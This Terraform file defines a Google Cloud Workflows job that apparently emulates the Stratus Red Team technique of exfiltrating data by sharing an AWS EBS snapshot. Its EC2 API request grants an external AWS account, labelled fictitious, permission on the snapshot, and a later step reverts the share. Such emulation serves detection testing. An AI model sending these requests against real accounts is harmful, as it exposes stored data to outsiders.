data "google_service_account" "workflows-to-cloudrun-sa" {
  account_id   = "workflows-to-cloudrun-sa"

}

data "aws_region" "current" {}

resource "google_workflows_workflow" "workflow_to_invoke_aws-ec2-share-ebs-snapshot_attack" {
  name            = "aws-ec2-share-ebs-snapshot-srt"
  description     = "A  workflow intended to match the functionality of the  Status Red Team attack technique 'AWS EC2 Share EBS Snapshot': https://stratus-red-team.cloud/attack-techniques/AWS/aws.exfiltration.ec2-share-ebs-snapshot/"
  service_account = data.google_service_account.workflows-to-cloudrun-sa.id
  project         = var.projectId
  source_contents = <<-EOF

######################################################################################
## Attack Description
######################################################################################

## This attack shares an EBS Snapshot with an external, fictitious AWS account, (012345678912)
## This module then reverts the share with the default user.

#####################################################################################
## Input
######################################################################################
##### INPUT: {"user":"user01"}
##### INPUT: {"user":"user02"}


######################################################################################
## User Agent
######################################################################################
#### Workflow executes with the User-Agent string: "AWS-Share-EBS-Snapshot-WORKFLOWEXECUTIONID"



######################################################################################
## Main Workflow Execution
######################################################################################
main:
  params: [args]
  steps:
    - assign:
        assign:
          - user: $${args.user}
          - projectID: $${sys.get_env("GOOGLE_CLOUD_PROJECT_ID")}  
    - getCloudRunURL:
        call: googleapis.run.v2.projects.locations.services.get
        args:
          name: '$${"projects/"+projectID+"/locations/us-central1/services/aws-proxy-app"}'
        result: appEndpoint 
    - ModifySnapshotAttribute:
        call: ModifySnapshotAttribute
        args:
            user: $${user}
            appEndpoint: $${appEndpoint.uri}
        result: response
    - RevertModifySnapshotAttribute:
        call: RevertModifySnapshotAttribute
        args:
            appEndpoint: $${appEndpoint.uri}
        result: revertResponse
    - return:
        return: $${response}


######################################################################################
## Submodules | Sub-Workflows
######################################################################################
ModifySnapshotAttribute:
  params: [user, appEndpoint]
  steps:  
    - ModifySnapshotAttribute:
        try:
            steps:
                - callModifySnapshotAttribute:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                          User-Agent: "Derf-Suspect-Priv-Esc-Workflow"
                      body:
                          HOST: "ec2.${data.aws_region.current.name}.amazonaws.com"
                          REGION: "${data.aws_region.current.name}"
                          SERVICE: "ec2" 
                          ENDPOINT: "https://ec2.${data.aws_region.current.name}.amazonaws.com"
                          BODY: "Action=ModifySnapshotAttribute&Version=2016-11-15&Attribute=createVolumePermission&OperationType=add&SnapshotId=${local.EBSSnapshotId}&UserId.1=012345678912"
                          UA: '$${"AWS-Share-EBS-Snapshot=="+sys.get_env("GOOGLE_CLOUD_WORKFLOW_EXECUTION_ID")}'
                          CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                          USER: $${user}
                          VERB: POST
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 404}
                        raise: $${response}
                      - condition: $${response.body.responseCode == 400}
                        raise: $${response}

        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

    - handle_result:
        switch:
          - condition: $${response.body.responseCode == 200}
            next: returnValidation
          - condition: $${response.body.responseCode == 403}
            next: permissionError
          - condition: $${response.body.responseCode == 400}
            next: MissingParameter

    - MissingParameter:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - The User you passed is not valid - First deprovision the user, then re-provision - try again"

    - returnValidation:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "SUCCESS - AWS EC2 Share EBS Snapshot Attack"

    - permissionError:
        return: 
          - $${response.body.responseBody}
          - $${response.body.responseCode}
          - "FAILURE - AWS EC2 Share EBS Snapshot Attack | This is typically a permission error"



RevertModifySnapshotAttribute:
  params: [appEndpoint]
  steps:  
    - RevertModifySnapshotAttribute:
        try:
            steps:
                - callRevertSnapshotAttribute:
                    call: http.post
                    args:
                      url: '$${appEndpoint+"/submitRequest"}'
                      auth:
                          type: OIDC
                      headers:
                          User-Agent: "Derf-Suspect-Priv-Esc-Workflow"
                      body:
                          HOST: "ec2.${data.aws_region.current.name}.amazonaws.com"
                          REGION: "${data.aws_region.current.name}"
                          SERVICE: "ec2" 
                          ENDPOINT: "https://ec2.${data.aws_region.current.name}.amazonaws.com"
                          BODY: "Action=ModifySnapshotAttribute&Version=2016-11-15&Attribute=createVolumePermission&OperationType=remove&SnapshotId=${local.EBSSnapshotId}&UserId.1=012345678912"
                          CONTENT: "application/x-www-form-urlencoded; charset=utf-8"
                          VERB: POST
                    result: response
                - checkNotOK:   
                    switch:
                      - condition: $${response.body.responseCode == 404}
                        raise: $${response}
        except:
            as: e
            steps:
                - known_errors:
                    switch:
                    - condition: $${not("HttpError" in e.tags)}
                      return: "Connection problem."
                    - condition: $${e.code == 404}
                      return: "Sorry, URL wasn’t found."
                    - condition: $${e.code == 403}
                      return: "Authentication error."
                - unhandled_exception:
                    raise: $${e}
                    
        retry:
            predicate: $${custom_predicate}
            max_retries: 3
            backoff:
                initial_delay: 1
                max_delay: 30
                multiplier: 2

custom_predicate:
  params: [response]
  steps:
    - what_to_repeat:
        switch:
          - condition: $${response.body.responseCode == 400}
            return: true
          - condition: $${response.body.responseCode == 409}
            return: true
          - condition: $${response.body.responseCode == 500}
            return: true
          - condition: $${response.body.responseCode == 500}
            return: true
    - otherwise:
        return: false

  EOF

}